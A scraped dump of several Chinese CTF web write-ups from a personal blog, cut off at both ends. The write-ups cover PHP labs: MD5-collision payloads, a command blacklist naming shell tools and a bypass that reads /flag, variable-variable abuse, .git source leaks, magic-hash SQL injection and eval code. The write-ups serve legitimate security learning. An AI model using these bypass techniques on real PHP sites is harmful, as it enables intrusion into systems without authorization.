hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;])));//将img参数进行编/解码后存储到$file中 $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file);//通过正则将文件中非字母、数字字符全部替换为空 if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixi～ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file));//否则进行输出 echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; //通过正则进行black list检查 if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { //否则进行MD5碰撞：首先比较POST请求中的a和b参数是否相等，然后比较它们的MD5哈希值是否相等。如果两个条件都满足，则执行$cmd命令，并输出结果；否则输出\u0026#34;md5 is funny ~\u0026#34;。 if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } 看完其实可以得知的是，要用POST传参\nfirst problem: MD5碰撞 参考这个——MD5碰撞的一些例子\n进行URL编码\n1 2 3 4 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 second problem: 绕过黑名单 dir 命令最基本的用途是列出当前目录的内容，最简单的使用方式是不带任何参数和选项，直接键入 dir，然后回车，默认就会列出当前目录中的内容\ndir%20\n1 2 555.png bj.png ctf3.jpeg index.php /表示目录，没有特别指明则输出所有目录名\ndir%20/\n1 2 3 4 bin dev flag lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上。\nca\\t%20/flag\n得到flag\nファンワイ MD5碰撞生成生成器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 //MD5碰撞生成字典 class batch_Md5(): def one_md5_encode(self, string): md5_data = hashlib.md5() md5_data.update(string.encode(\u0026#34;utf-8\u0026#34;)) print(string +\u0026#34; ===\u0026gt; \u0026#34;+md5_data.hexdigest()) def batch_md5_encode(self, file, outfile): for strtmp in file: strtmp = strtmp.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;) time.sleep(1) try: md5_data = hashlib.md5() md5_data.update(str(strtmp).encode(\u0026#34;utf-8\u0026#34;)) res = md5_data.hexdigest() with open(outfile, \u0026#34;a\u0026#34;) as fw: fw.writelines(str(res) + \u0026#34;\\n\u0026#34;) print(strtmp +\u0026#34; ===\u0026gt; \u0026#34;+res) except Exception as e: print(\u0026#34;md5加密超时！\u0026#34;) return res if(__name__ == \u0026#34;__main__\u0026#34;): title() parser = argparse.ArgumentParser(description=\u0026#34;Made md5 Dicts Script\u0026#34;) parser.add_argument( \u0026#39;-s\u0026#39;, \u0026#39;--string\u0026#39;, type=str, metavar=\u0026#34;\u0026#34;, help=\u0026#39;Please input strings to md5 encode. eg: afei\u0026#39; ) parser.add_argument( \u0026#39;-f\u0026#39;, \u0026#39;--file\u0026#39;, type=argparse.FileType(\u0026#39;r\u0026#39;), metavar=\u0026#34;\u0026#34;, help=\u0026#39;Please input file path for batch encode. eg: c:/str.txt\u0026#39; ) parser.add_argument( \u0026#39;-o\u0026#39;, \u0026#39;--outfile\u0026#39;, metavar=\u0026#34;\u0026#34;, help=\u0026#34;Please input path for output file. eg：c:/output.txt\u0026#34; ) args = parser.parse_args() run = batch_Md5() if args.string: run.one_md5_encode(args.string) exit() if args.file: run.batch_md5_encode(args.file, args.outfile) else: print(\u0026#34;请输入-h选项查看用法！\u0026#34;) ","date":"2023-10-29T18:25:17+08:00","permalink":"https://66lueflam144.github.io/p/e69dffe/","title":"Easy Web"},{"content":"打开靶场是一个非常正式的网页？到处扒拉一下，也在contact处进行了intruder测试，没有什么结果。\n再查看页面代码和网络，也没有什么。所以又启动TOOLs。\n那句话怎么说来着？dirmap一扫描起来，就发了狠……反正扫出很多东西。\n比较瞩目的是前排好多zip，www，rar，bak——因为之前一些靶场中，这些往往就是把源码下载到本地的URL。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [200][application/octet-stream][137.00b] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/.git/config [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/admin.rar [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.rar [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/a.rar [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2014.rar [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2015.zip [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bak.rar [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/bbs.zip [200][text/html; charset=UTF-8][28.44kb] http://e504e764-ea4e-4800-9e92-02b69f55df33.node4.buuoj.cn/2.zip ...仅截取部分 不过这次一个个点开，没有一个进行下载任务。\n目标转向第一个文件/.git/。如果用github clone或者配置过github pages+hexo那倒霉玩意的，可能有点熟悉这个是什么。\n出动GitHack\n下载下来一个文件夹，里面有：\n1 2 3 4 5 6 assets flag.php index.php $$x?第一次看还觉得很陌生…… flag.php中：\n1 2 3 4 5 6 \u0026lt;?php $flag = file_get_contents(\u0026#39;/flag\u0026#39;); 在index.php中看到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 依旧是先translate一下：\n1.包含flag.php文件\n2.三个变量如代码所述不再重复\n3.foreach()函数：用于遍历数组中的每个元素，并将当前元素的值赋给一个变量\n- 1）获取当前元素的键名（$key获取）：foreach ($array as $key =\u0026gt; $value）{// 执行操作}\n- 2）遍历对象属性($key获取当前属性名称，$value获取当前属性的值)：foreach ($object as $key =\u0026gt; $value) {// 执行操作}\n4.可变变量$$x：是一种特殊的语法，允许使用变量的值作为另一个变量的名称。$a = 'hello';$b = 'a';echo $$b; // 输出：hello foreach() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } //POST传入ass=flag, $x=ass, $y=flag, $$x=$y=$ass=flag foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } //GET传入ass=flag, $x=ass, $y=flag, $$y=$flag, $$x=$ass, $$x=$$y=$flag, $ass=$flag 1 1 2 3 4 5 6 7 8 9 10 foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } GET传入flag=?，进行判断:\n1.如果$_GET['flag'](获取通过 GET 请求方式传递的参数中名为 \u0026ldquo;flag\u0026rdquo; 的值的方法)等于$x\n2.并且$x不等于flag就输出$handsome的值。\npayload flag=ass,$_GET['flag']=ass, $x=flag, 不符合判断条件\nflag=ass\u0026amp;ass=flag, 有两个键值对flag=\u0026gt;ass, ass=\u0026gt;flag，\n1.$_GET['flag']=ass, $x=flag不成立——ass!=flag \u0026amp;\u0026amp; flag==flag\n2.$_GET['flag']=ass, $x=ass,成立——ass===ass \u0026amp;\u0026amp; ass!==flag输出$handsome。\n最终Payload\n1.?handsome=flag\u0026amp;flag=s\u0026amp;s=flag：比较麻烦的一种，就是遵循上述逻辑\n2.?handsome=flag\u0026amp;flag=handsome：最佳，没有把第二个foreach()忽略，使$handsome=$flag，同时引用上面的逻辑进行了解题。\n2 1 2 3 4 5 6 7 8 if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } //GET请求和POST请求中都没有名为 \u0026#34;flag\u0026#34; 的参数，则执行 exit($yds) ?yds=flag即可，原理是第二个foreach()\n3 1 2 3 4 5 6 7 8 if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } // ?flag=flag\u0026amp;is=flag\nPOST没有变量$x=$y所以2和3（好像）都只有GET方式的解决方式。但是我昨天晚上记得随便POST传参yds=flag确实得到flag了。。。可能只是幻觉\n如果问flag在哪里那我只能说，flag与你同在。\nファンワイ Bypass GET传参，1默认类型为int，作为value时类型为string。\n?handsome=flag\u0026amp;flag=1\u0026amp;1=flag：\nflag=(string)1\u0026amp;(int)1=flag，所以就发生了一点Bypass——无法进入if判断语句，就绕过它。得到一个the flag is:。\n","date":"2023-10-28T18:14:37+08:00","permalink":"https://66lueflam144.github.io/p/38e9ef8/","title":"Mark_Loves_Cat"},{"content":"之前还是一个新手村门口人的时候打开过，那个时候的无助真的有点好笑。\nCUIT Student 一般这种什么都不外露的就先查看页面源代码，所以找到了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!-- ~~~post money and password~~~ if (isset($_POST[\u0026#39;password\u0026#39;])) { $password = $_POST[\u0026#39;password\u0026#39;]; if (is_numeric($password)) { echo \u0026#34;password can\u0026#39;t be number\u0026lt;/br\u0026gt;\u0026#34;; }elseif ($password == 404) { echo \u0026#34;Password Right!\u0026lt;/br\u0026gt;\u0026#34;; } } --\u0026gt; POST传参，目前还用不到。所以我们抓包：\n1 2 3 4 5 6 7 8 9 10 GET /pay.php HTTP/1.1 ... Accept-Language: ja,zh-CN;q=0.9,zh;q=0.8 Cookie: user=0 Connection: close 有一个cookie: user=0，发送repeater模块，试试修改为1。得到you are Cuiter\npsw can\u0026rsquo;t be number 最开始没有注意到这个is_numeric()，自信的写404，然后得到了不能是数字的回复。\n当时我满脑子？？？？？？？？？\n不能是404但是又必须是404？？？？？？？\n小小的脑袋塞满了大大的问号。\n不过因为在做这个之前做了Easy MD5，知道了PHP的神秘宇宙规则——在PHP的宇宙里，不能是404但是又必须是404完全可以做到。\n就是那个PHP弱类型比较。\n做一个简单的测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php $a=404; $b=\u0026#39;404abc\u0026#39;;//进行修改 //是否相等,目标为true $c=var_dump($a==$b); //是否是数字，目标为false $d=var_dump(is_numeric($b)); echo $c,$d; ?\u0026gt; 在 PHP 中，var_dump() 函数主要用于打印变量的相关信息，如类型、值和长度等。它并不直接用于进行布尔值判断。当 var_dump() 函数用于布尔值时，它会输出该布尔值的类型和值。\n所以构造payload：\n1 2 password=404abc\u0026amp;money=100000000 注意是用post的方式传参\nNember lenth is too long 当使用 POST 方法向 PHP 文件传递参数时，参数的值通常需要进行 URL 编码。这是为了确保参数值中不包含特殊字符或空格等无效字符，从而避免出现错误。\n当尝试将 money 参数的值设置为 100000000 时，由于该值太长，可能会导致 URL 长度超过服务器限制，从而导致请求失败。\npassword=404abc\u0026amp;money[]=1——php对字符进行判断的函数存在漏洞，数组可以很好的绕过\n不过可能是strcmp()函数漏洞利用\n另外一种是科学记数法：money=100000000=1e9\n","date":"2023-10-27T13:02:11+08:00","permalink":"https://66lueflam144.github.io/p/71ccb67/","title":"Buy Flag"},{"content":"只是隐隐约约记得MD5是一种加密算法\nSQL Injection？ 输入：\n数字\n字母\n数字+符号\n简单SQL语句\n简单XSS语句\n都没什么效果，所以抓包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /leveldo4.php?password=1 HTTP/1.1 Host: f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81 Upgrade-Insecure-Requests: 1 ... Referer: http://f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81/leveldo4.php?password=9 Accept-Encoding: gzip, deflate ... 查看Response\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 HTTP/1.1 200 OK Server: openresty Date: Fri, 27 Oct 2023 04:28:47 GMT Content-Type: text/html; charset=UTF-8 Connection: close Hint: select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) X-Powered-By: PHP/7.3.13 Content-Length: 3107 那个Hint(从 admin 表中选择密码字段等于 $pass 变量的 MD5 值的记录),比较显眼。所以启用sqlmap。\n同时也启用dirsearch和dirmap（结果是什么也没得到）。\n结果:\nsqlmap——GET parameter 'password' does not seem to be injectable\ndirmap——没有可用信息\ndirsearch——几个200 URL都是跳转leveldo4.php\nMD5？ 再回看Hint：\nPHP中md5函数如果第二个参数设为true，返回的是二进制内容，如果能恰好凑出类似\u0026rsquo;or的字符串，就可以构成SQL注入\n所以就是要构造一个经过MD5再经过二进制后得到的值有‘or的payload。\n上网找了找，说是有\nffifdyop 将password的值修改为ffidyop就会跳转界面levels91.php。\n好大一个Do You Like MD5?\n查看页面代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!-- $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ //... } --\u0026gt; 从 GET 请求参数中获取 a 和 b 的值，并将它们分别赋给变量 $a 和 $b。 接下来，使用条件判断语句进行逻辑判断。如果 $a 不等于 $b 并且 $a 的 MD5 值等于 $b 的 MD5 值，即 md5($a) == md5($b)，则进入条件判断的代码块内部。 所以接下来又是寻找符合条件的a与b。\n有两种解决方式：\n1.PHP弱类型比较绕过\n参考PHP hash漏洞之MD5可以得到：\nPHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 （为什么说是hash值？）\n另一个简洁版本：PHP MD5相等绕过\n构造payload：\n1 2 ?a=s878926199a\u0026amp;b=s155964671a 2.数组绕过\n在上面那个简洁版本里也提到了这个数组绕过，不过说PHP8就行不通了。不过靶场的PHP依旧适用。\n参考PHP弱类型绕过:\nmd5()/sha()这类函数无法处理数组，如果传入的是数组,md5()返回NULL，加密后得到的也是NULL，满足两个md5值相等 构造payloa：\n1 2 ?a[]=1\u0026amp;b[]=2 a[]=1\u0026amp;b[]=2，其中 a[] 和 b[] 是数组参数。当 PHP 解析这个查询字符串时，它会将这些参数解析为数组。\n1 2 3 4 $_GET[\u0026#39;a\u0026#39;] = array(\u0026#39;1\u0026#39;); $_GET[\u0026#39;b\u0026#39;] = array(\u0026#39;2\u0026#39;); 由于md5()函数存在缺陷,加密数组的时候返回值是NULL，即在MD5加密之后，a[]=NULL、b[]=NULL，符合要求。 然后我们又跳转页面\u0026hellip;\nparam？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } 其实可以看出就是call back，只不过要以POST方式传参，所以打开我的firefox渗透版:\n1 2 3 4 5 6 http://fdcf43aa-9abd-4770-8798-7d1efbb1ffb0.node4.buuoj.cn:81/levell14.php //post data param1[]=1\u0026amp;param2[]=2 最后得到flag。\nファンワイ 比较详细的解释了PHP比较和绕过的原理：PHP 黑魔法\nCTF WEB PHP弱类型绕过\n","date":"2023-10-27T13:00:25+08:00","permalink":"https://66lueflam144.github.io/p/09030b0/","title":"BJDCTF Easy MD5"},{"content":"Scan 看到这种白茫茫一片的就直接上工具。\ndirsearch、dirmap一起用\ndirmap以迅雷不及掩耳之速扫出： 1 2 3 4 5 6 7 8 9 10 11 12 [200][text/plain; charset=utf-8][21.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/HEAD [200][text/plain; charset=utf-8][265.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/COMMIT_EDITMSG [200][application/octet-stream][289.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/index [200][text/plain; charset=utf-8][459.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/logs/HEAD [200][text/plain; charset=utf-8][112.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/packed-refs [200][text/plain; charset=utf-8][177.00b] http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/logs/refs/remotes/origin/HEAD dirsearch慢慢来到起跑线： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 200 265B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/COMMIT_EDITMSG 200 73B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/description 502 0B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.gdrive/token_v2.json 403 316B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/hooks/ 200 295B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/config 200 21B http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/HEAD ...//还有很多就省略了 githack \u0026amp; hack 再用githack\n1 2 python .\\GitHack.py http://30e2220f-465d-4920-82f8-01d52c8f6522.node4.buuoj.cn:81/.git/ 下载下来一个文件夹，其中比较重要的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //bo0g1pop.php \u0026lt;?phphighlight_file(__FILE__); if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\W]+\\((?R)?\\)/\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;star\u0026#39;])) { if(!preg_match(\u0026#39;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i\u0026#39;,$_GET[\u0026#39;star\u0026#39;])){ eval($_GET[\u0026#39;star\u0026#39;]); } } 本文盲看不懂但知道是GET传参，参数是star，还有正则表达式。（官方————无参数命令执行）\n测评\u0026amp;ファンワイ 测评 这次出动了dirsearch、dirmap、githack。\n然后在速度方面dirmap完虐dirsearch。\ngithack这个呢，最开始在CTFHub下载的，结果是一个老版本，只适用于python2……我……\n在zn网页找不到升级版反而找到一堆怎么pip2的，就去了GitHub上找……结果人家去年就搞了升级版的……沉默是今晚的康桥……这个延迟度比我的Google验证码还延迟……\nファンワイ 在用githack下载/.git/的时候，火绒蹦出来说有危险立马消杀，留下我目瞪口呆。开虚拟机好麻烦的啊……火绒你……\n2024：现在已经离不开虚拟机了","date":"2023-10-23T18:20:10+08:00","permalink":"https://66lueflam144.github.io/p/1573821/","title":"R！C！E！"},{"content":" 知道查看js文件，知道可以修改值但是修改错方向导致痛失……\n官方给的有两种方法\n1.burp suite change the request method\n2.修改gameScore值\n研究页面 只截取了最重要的地方：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 ... /**********游戏当前状态************/ var curPhase = PHASE_DOWNLOAD; var gameScore = 0; ... //游戏结束 function gameover(){ if(gameScore \u0026gt; 100000){ var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;/api.php\u0026#34;, true); xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); xhr.onreadystatechange = function() { if (xhr.readyState === 4 \u0026amp;\u0026amp; xhr.status === 200) { var response = JSON.parse(xhr.responseText); alert(response.message); } }; var data = { score: gameScore, }; xhr.send(JSON.stringify(data)); } alert(\u0026#34;成绩：\u0026#34;+gameScore); gameScore=0; curPhase =PHASE_READY; ... } xhr调用XMLHttpRequest()来构造请求——xh.open()中又可以看到是以POST的方式，对api.php进行请求。\n请求过程中会发送一个JSON文件，发送的data内容是score:gameScore。\n而成绩是gameScore的值。\nburp 这个比较新（for me），刷新网站抓包得到GET请求头\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 GET / HTTP/1.1 Host: 9ab09171-214d-4d99-aad4-4f4057a063da.node4.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Modified-Since: Sun, 26 Mar 2023 07:18:44 GMT If-None-Match: \u0026#34;2cb-5f7c86fc11d00-gzip\u0026#34; 然后就用burp的改变请求方式把它变成POST：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 POST /api.php HTTP/1.1 Host: 0d390052-3ebd-49f4-a519-064f1abd00bb.node4.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 17 {\u0026#34;score\u0026#34;:1000000} 发送之后就会得到flag。\n修改页面代码 控制台上执行代码，可以修改掉某个变量或者某个函数达到目）\n在控制台输入gameScore=100000然后想办法让飞机最快速度坠毁就可以最快速度得到flag。\n尝试直接修改js代码最开始的gameScore=100000但是没有效果。 - 具体可以体现为，第一种后可以看到游戏界面的Score变成了100000，而第二种依旧是0；\n- 至于为什么无效，理解为js缓存的问题——游戏使用的仍然是之前的js缓存，如果刷新，得到的是从服务器发来的js缓存，人为修改的js没有上场机会。\n参考： 控制台运行JavaScript\n虽然是讨论chrome浏览器但完全可以套用在every\n","date":"2023-10-23T13:17:04+08:00","permalink":"https://66lueflam144.github.io/p/dd90fd2/","title":"newstar CTF 2023 听说你是个游戏高手"},{"content":" 其实看这个名字的时候就在想是不是和目录遍历有关了。\nScan 打开靶场页面检查发现确实没有什么，所以用dirsearch扫描一下。\n在经历漫长扫描后，在report中找到扫描文件报告打开，查找响应状态码为200的文件，得到：\n1 2 3 4 200 0B http://89ecddd8-8816-4676-a066-6ed0467a4fdc.node4.buuoj.cn:81/flag.php 200 347B http://89ecddd8-8816-4676-a066-6ed0467a4fdc.node4.buuoj.cn:81/index.php.bak 看大小就知道第二个有一些东西，输入网址得到一个bak文件的下载。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 //index.php.bak \u0026lt;?php include_once \u0026#34;flag.php\u0026#34;; if(isset($_GET[\u0026#39;key\u0026#39;])) { $key = $_GET[\u0026#39;key\u0026#39;]; if(!is_numeric($key)) { exit(\u0026#34;Just num!\u0026#34;); } $key = intval($key); $str = \u0026#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\u0026#34;; if($key == $str) { echo $flag; } } else { echo \u0026#34;Try to find out source file!\u0026#34;; } 进行一些翻译：\ninclude_once \u0026quot;flag.php\u0026quot;; 表示在代码中包含了一个名为 flag.php 的文件。通过这行代码，flag.php 文件中的内容会被复制到当前代码文件的相应位置——这样做的目的是为了引入该文件中定义的变量、函数或类，以便在当前代码文件中使用它们。 如果 HTTP GET 请求中带有 key 参数，代码将进入相应的条件判断分支。 key 参数的值被赋给变量 $key。 如果 $key 不是一个数字（通过 is_numeric 函数判断），将输出 \u0026ldquo;Just num!\u0026rdquo; 并终止程序执行。 如果 $key 是一个数字，则将其转换为整数（通过 intval 函数实现）。 字符串变量 $str 初始化为 \u0026ldquo;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\u0026rdquo;。 如果 $key 的值等于 $str 的值，将输出 flag 的值。 如果没有提供 key 参数，将输出 \u0026ldquo;Try to find out source file!\u0026quot;。 translate ?key= 所以去看看flag.php有什么，但是打开是一片空白。\n（在这里犯了一个错误，就是认为key这个请求参数是在flag.php下生效。然后搞半天没有任何东西。）\n其实从index.php.bak这个名字就可以知道是和index.php有关。不过网站的默认首页就是它，所以不用写http://xx/index.php?key=，直接写http://xx/?key=就行。\nJust Num 前面提到一个is_numeric()函数判断是否是数字，所以$key=$str的值其实只是123.\n(把$str的值ctrl+c上去，得到一个just num，嗯，想起来高中时候的一些题目。)\nファンワイ 因为嫌弃dirsearch太慢所以去找了个新的dirmap，但是没有任何out file生成……可能还需要调一下配置。\n","date":"2023-10-23T12:52:06+08:00","permalink":"https://66lueflam144.github.io/p/4c47f54/","title":"ACTF 2020 Back File"},{"content":"笑死我了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⢀⣴⠟⠉⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣀⢀⣾⠿⠻⢶⣄⠀⠀⣠⣶⡿⠶⣄⣠⣾⣿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢻⣿⣿⡿⣿⠿⣿⡿⢼⣿⣿⡿⣿⣎⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠉⠛⢛⣛⡉⠀⠀⠙⠛⠻⠛⠑⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ # 